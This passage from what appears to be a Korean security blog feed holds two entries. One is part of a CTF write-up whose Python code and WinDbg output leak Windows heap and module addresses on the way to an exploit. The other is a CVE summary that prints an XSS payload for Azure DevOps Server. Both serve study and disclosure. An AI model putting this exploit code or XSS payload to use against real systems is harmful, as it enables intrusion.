&#xD560;&#xB2F9;&#xB418;&#xC5B4; &#xC21C;&#xC11C;&#xB294; &#xB4A4;&#xC8FD;&#xBC15;&#xC8FD;&#xC774;&#xC9C0;&#xB9CC; &#xC639;&#xAE30;&#xC885;&#xAE30; &#xC608;&#xC058;&#xAC8C; &#xBAA8;&#xC5EC;&#xC788;&#xB294; &#xAC83;&#xC774; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. chunk17&#xBD80;&#xD130;&#xB294; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xC0C8; userblock&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; LFH chunk&#xB294; &#xAE30;&#xC874; userblock&#xC744; &#xBAA8;&#xB450; &#xCC44;&#xC6B8; &#xC815;&#xB3C4;&#xC778; 0~16&#xAE4C;&#xC9C0; 17&#xAC1C;&#xB9CC; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>&#xB97C; &#xCC38;&#xACE0;&#xD574; &#xD574;&#xB2F9; userblock&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; block&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png" alt="pwncoolsexy-part4/Untitled%2013.png"></p><p>&#xC774;&#xC81C; LFH5 chunk&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; add(LFH4)&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xC81C;&#xD6C4; &#xC7AC; &#xD560;&#xB2F9;&#xB41C; <code>LFH4&#x2192;data</code> &#xAC00; LFH5 chunk&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. data&#xC5D0; &#xC785;&#xB825;&#xD55C; <code>aaaaaaaa</code> &#xB3C4; &#xC798; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB124;&#xC694;!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png" alt="pwncoolsexy-part4/Untitled%2014.png"></p><p>&#xC774;&#xC81C; <code>0x70</code>&#xB9CC;&#xD07C; &#xCC44;&#xC6B0;&#xBA74; &#xB4A4;&#xC758; heap address&#xB85C; heap base address&#xC640; &#xBC14;&#xB85C; &#xB4A4; chunk&#xC758; key&#xAE4C;&#xC9C0; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span> p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" alt="pwncoolsexy-part4/Untitled%2015.png"></p><p>&#xBC14;&#xB85C; &#xB4A4;&#xC5D0; &#xC788;&#xB294; chunk&#xC758; key&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; overflow&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; leak &#xD55C; key&#xC758; <code>data</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC8E0;! &#xC6B0;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>ntdll base: ROP gadget</li><li>image base</li><li>kernel32 base: <code>CreateFile()</code>, <code>ReadFile()</code>, <code>WriteFile()</code></li><li>PEB : <code>ProcessParameters</code>(stdin, stdout, stderr)</li><li>stack address</li></ul><h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> &#xC740; <code>heap_base + 0x2c0</code> &#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png" alt="pwncoolsexy-part4/Untitled%2016.png"></p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png" alt="pwncoolsexy-part4/Untitled%2017.png"></p><p><code>Lock - 0x163d30</code> &#xB85C; ntdll&#xC758; base address&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xADF8;&#xB9AC;&#xACE0; &#xC708;&#xB3C4;&#xC6B0; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB54C;&#xBB38;&#xC5D0; ntdll &#xBC84;&#xC804;&#xC774; &#xBC14;&#xB00C;&#xC5B4; <code>0x163dd0</code>&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xB2E4;&#xB294; &#xC2AC;&#xD508; &#xC0AC;&#xC5F0;&#xC774;&#x2026; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xBBF8;&#xC6CC;)</p><pre><code class="hljs python"><span class="hljs-comment">#...</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment">#...</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>)<span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comment">#Lock - ntdll base address offset</span>print(hex(ntdll))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" alt="pwncoolsexy-part4/Untitled%2018.png"></p><h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; imagebase&#xB3C4; &#xAE08;&#xBC29; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; <code>PebLdr</code> &#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><blockquote><p>PebLdr : &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8;&#xB4E4;&#xC758; Double Linked List&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC73C;&#xBA70; <code>_PEB&#x2192;Ldr</code>&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD55C;&#xB2E4;.</p></blockquote><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm start             end                 module name...           <span class="hljs-number">00007f</span>fd`ea290000 <span class="hljs-number">00007f</span>fd`ea47d000   ntdll      (pdb symbols)    <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`ea3f53c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 ((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)            : <span class="hljs-number">0x7ffdea3f53c0</span> [Type: _PEB_LDR_DATA *]    [+<span class="hljs-number">0x000</span>] Length           : <span class="hljs-number">0x58</span> [Type: unsigned long]    [+<span class="hljs-number">0x004</span>] Initialized      : <span class="hljs-number">0x1</span> [Type: unsigned char]    [+<span class="hljs-number">0x008</span>] SsHandle         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-built_in">void</span> *]    [+<span class="hljs-number">0x010</span>] InLoadOrderModuleList [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x020</span>] InMemoryOrderModuleList [Type: _LIST_ENTRY]...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre><p><code>PebLdr</code> &#xC740; <code>ntdll + 0x1653c0</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>PebLdr</code>&#xC5D0;&#xC11C; &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC; dadadb&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBAA8;&#xB4C8;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xBA74; <code>ntdll!_PEB_LDR_DATA&#x2192;InMemoryOrderModuleList(+0x20)</code> &#xC5D0; &#xBA3C;&#xC800; &#xB85C;&#xB4DC;&#xB41C; &#xC21C;&#xC11C;&#xB300;&#xB85C; Double Linked List&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC2E4;&#xD589;&#xC911;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB3C4; &#xB2F9;&#xC5F0;&#xD788; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xACA0;&#xC8E0;?</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))(*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))                 [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x000</span>] Flink            : <span class="hljs-number">0x185b0702660</span> [Type: _LIST_ENTRY *]    [+<span class="hljs-number">0x008</span>] Blink            : <span class="hljs-number">0x185b0704020</span> [Type: _LIST_ENTRY *]<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x185b0702660</span><span class="hljs-number">00000185</span>`b0702660  <span class="hljs-number">00000185</span>`b07024d0<span class="hljs-number">00000185</span>`b0702668  <span class="hljs-number">00007f</span>fd`ea3f53e0 ntdll!PebLdr+<span class="hljs-number">0x20</span><span class="hljs-number">00000185</span>`b0702670  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702678  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702680  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d0000 dadadb<span class="hljs-number">00000185</span>`b0702688  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d1eb0 dadadb+<span class="hljs-number">0x1eb0</span><span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>...</code></pre><p>&#xC798; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB124;&#xC694;! </p><pre><code class="hljs python"><span class="hljs-comment">#...</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;InMemoryOrderModuleList: &quot;</span>,hex(IMOML))imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))<span class="hljs-comment">#...</span></code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" alt="pwncoolsexy-part4/Untitled%2019.png"></p><h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; kernel32 base address&#xB294; IAT &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xC81C;&#xAC00; &#xC791;&#xB144;&#xC5D0; &#xCD9C;&#xC81C;&#xD55C; &#xBB38;&#xC81C;&#xC778; <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000...<span class="hljs-number">3000</span> [     <span class="hljs-number">230</span>] address [size] of Import Address Table Directory...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name...    <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000 <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>eb12000   KERNEL32   (pdb symbols) ...                <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">00007f</span>f6`a72d0000 + <span class="hljs-number">3000</span> L230<span class="hljs-number">00007f</span>f6`a72d3000  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 KERNEL32!ReadFile<span class="hljs-number">00007f</span>f6`a72d3008  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e7e0 KERNEL32!HeapCreateStub<span class="hljs-number">00007f</span>f6`a72d3010  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea763a0 KERNEL32!HeapFreeStub<span class="hljs-number">00007f</span>f6`a72d3018  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7c660 KERNEL32!GetStdHandleStub<span class="hljs-number">00007f</span>f6`a72d3020  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ed7aa20 ntdll!RtlAllocateHeap<span class="hljs-number">00007f</span>f6`a72d3028  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e970 KERNEL32!IsDebuggerPresentStub<span class="hljs-number">00007f</span>f6`a72d3030  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>edb4410 ntdll!RtlInitializeSListHead...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre><p><code>kernel32!ReadFile</code> &#xD568;&#xC218;&#xB294; kernel32 base&#xC758; <code>0x22460</code>&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" alt="pwncoolsexy-part4/Untitled%2020.png"></p><p>&#xC790; &#xC774;&#xC81C; &#xAC70;&#xC758; &#xB2E4;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;..!</p><h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> &#xB85C; PEB&#xC640; TEB, Stack&#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !address -summary--- Largest Region by Usage ----------- Base Address -------- Region Size ----------Free                                    <span class="hljs-number">275</span>`<span class="hljs-number">1e0</span>c0000     <span class="hljs-number">7</span>b7f`<span class="hljs-number">3</span>dea0000 ( <span class="hljs-number">123.497</span> TB)MappedFile                             <span class="hljs-number">7</span>df5`<span class="hljs-number">5f</span>ec4000      <span class="hljs-number">1f</span>f`d6aed000 (   <span class="hljs-number">1.999</span> TB)&lt;unknown&gt;                              <span class="hljs-number">7</span>df4`<span class="hljs-number">5</span>c060000        <span class="hljs-number">1</span>`<span class="hljs-number">00020000</span> (   <span class="hljs-number">4.000</span> GB)Image                                  <span class="hljs-number">7f</span>fd`<span class="hljs-number">4</span>a817000        <span class="hljs-number">0</span>`<span class="hljs-number">00163000</span> (   <span class="hljs-number">1.387</span> MB)Stack                                    e4`<span class="hljs-number">4f</span>c00000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>c000 (<span class="hljs-number">1008.000</span> kB)Heap                                    <span class="hljs-number">275</span>`<span class="hljs-number">1</span>dfce000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>1000 ( <span class="hljs-number">964.000</span> kB)Other                                  <span class="hljs-number">7</span>df5`<span class="hljs-number">5e0</span>a0000        <span class="hljs-number">0</span>`<span class="hljs-number">00033000</span> ( <span class="hljs-number">204.000</span> kB)TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre><p>PEB&#xB294; ntdll&#xC758; bss &#xC601;&#xC5ED;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xBA70; PEB &#xC8FC;&#xC18C;&#xB294; &#xC544;&#xAE4C; &#xAD6C;&#xD55C; <code>pebldr</code> &#xC8FC;&#xC18C; &#xADFC;&#xCC98;&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xB4A4;&#xC801;&#xB4A4;&#xC801;&#xAC70;&#xB9AC;&#xBA70; &#xCC3E;&#xB2E4; &#xBCF4;&#xBA74; &#xB098;&#xC635;&#xB2C8;&#xB2E4; &#x314E;&#x314E;;</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name    ...    <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d6a0000 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d890000   ntdll<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0  - <span class="hljs-number">100</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d8052c0  ffffffff`ffffffff...<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805328  <span class="hljs-number">000000e4</span>`<span class="hljs-number">4f</span>9c9240<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre><p><code>PEB+0x240</code>&#xC740; <code>ntdll+0x165328</code>&#xC5D0; &#xC788;&#xC73C;&#xBA70; TEB&#xB294; <code>PEB + 0x1000</code>&#xC5D0;, Stack address&#xB294; <code>TEB + 0x10</code>&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xAC19;&#xC774; &#xAD6C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key, teb+<span class="hljs-number">0x10</span>)print(<span class="hljs-string">&quot;peb :&quot;</span>,hex(peb))print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" alt="pwncoolsexy-part4/Untitled%2021.png"></p><hr><p>&#xB4DC;&#xB514;&#xC5B4;&#x3153;&#x3153;&#x3153; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; exploit&#xC744; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC73C;&#xBA70; &#xC804; &#xADF8;&#xB7FC; &#xC774;&#xBBF8; &#xB9DD;&#xD55C; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xACF5;&#xBD80;&#xD558;&#xB7EC; 20000..</p><h1 id="Part-5-&#xC608;&#xACE0;"><a href="#Part-5-&#xC608;&#xACE0;" class="headerlink" title="Part 5 &#xC608;&#xACE0;"></a>Part 5 &#xC608;&#xACE0;</h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" alt="pwncoolsexy-part4/Untitled%2022.png"></p><blockquote><p>??? : &#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;   -2020 &#xACA8;&#xC6B8;, &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF &#xBB38;&#xC81C; &#xC81C;&#xC791; &#xC911;-</p></blockquote><p>&#xACFC;&#xC5F0; &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC791;&#xB144;&#xACFC; &#xAC19;&#xC740; &#xCC38;&#xC0AC; &#xC5C6;&#xC774; &#xC775;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD574; Flag&#xB97C; &#xC601;&#xC811;&#xD560; &#xC218; &#xC788;&#xC744;&#xC9C0;&#x2026;</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28459: Microsoft Azure DevOps Server Reflected XSS</title>
    <link href="/2021/04/17/fabu1ous/2021-04-17/"/>
    <url>/2021/04/17/fabu1ous/2021-04-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162190/SA-20210414-0.txt">CVE-2021-28459</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Azure DevOps Server 2020.0.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Azure DevOps Server&#xB294; &#xD300; &#xB2E8;&#xC704;&#xC758; &#xC18C;&#xD504;&#xD2B8;&#xC6CC;&#xC5B4; &#xAC1C;&#xBC1C; &#xD611;&#xC5C5; &#xD234;&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xB294; &#xD574;&#xCEE4;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; Collection Setting&#xC5D0; &#xC811;&#xADFC;&#xD574; Reflected XSS &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProcessTemplate</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">metadata</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>XSS here: <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.URL)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>This template is flexible and will work great<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;aa12a345-00a0-1f11-ba00-b12345b12345&quot;</span> <span class="hljs-attr">major</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">minor</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span></code></pre><p>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB294; Collection Setting &gt; Process&#xC5D0; <code>.zip</code>&#xD30C;&#xC77C; &#xD615;&#xD0DC;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD0EC;&#xD50C;&#xB9BF;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD0EC;&#xD50C;&#xB9BF; &#xAD6C;&#xC870;&#xC5D0; &#xB530;&#xB974;&#xBA74; <code>ProcessTemplate.xml</code> &#xD30C;&#xC77C;&#xC740; <code>&lt;name&gt;</code>&#xC744; &#xD3EC;&#xD568;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370; XSS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC5B4; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD0EC;&#xD50C;&#xB9BF; &#xC5C5;&#xB85C;&#xB4DC; &#xC2DC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD15C;&#xD50C;&#xB9BF;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xB744;&#xC6B0;&#xBA70; &#xC0BD;&#xC785;&#xB41C; JavaScript&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
